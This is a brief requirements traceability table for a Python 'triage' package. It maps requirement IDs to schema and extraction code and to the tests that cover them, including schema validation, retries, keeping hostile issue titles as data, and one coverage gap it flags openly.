| R2, R3, R9 | `src/triage/schema.py` `TriageRecord`; `extract.py` `_to_record` | `test_record_rejects_extra_fields_and_out_of_range`, `test_invalid_twice_is_a_failure_not_a_guess` |
| R8 | `extract.py` `_to_record` | `test_identity_comes_from_input_not_model` |
| R10 | `extract.py` `_triage`, `MAX_ATTEMPTS` | `test_invalid_then_valid_recovers_on_retry` |
| R13 | `extract.py`: no shell use anywhere in `src/triage` | `test_hostile_title_is_only_data` |
| R11, R12 | `cli.py` loop, `schema.Issue` | **none yet** (gap) |
| R18 | whole package | `uv run pyright` |
